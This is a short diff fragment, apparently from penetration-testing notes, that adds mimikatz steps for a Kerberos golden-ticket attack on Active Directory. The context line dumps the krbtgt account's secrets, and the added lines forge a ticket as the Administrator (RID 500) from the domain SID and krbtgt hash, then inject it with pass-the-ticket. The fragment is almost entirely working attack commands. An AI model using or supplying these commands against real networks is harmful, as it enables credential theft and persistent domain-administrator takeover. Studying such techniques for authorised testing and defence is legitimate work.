@@ -43,7 +43,8 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 
 [from the output, copy the SID of the domain and the NTLM hash of the krbtgt account for use in the following command]
 
-
-
+mimikatz # kerberos::golden /User:<USERNAME (can be real, like Administrator, or made up)> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt
+- /id:500 is the Administrator account's RID
+- /ptt stands for "pass the ticket"
 
 
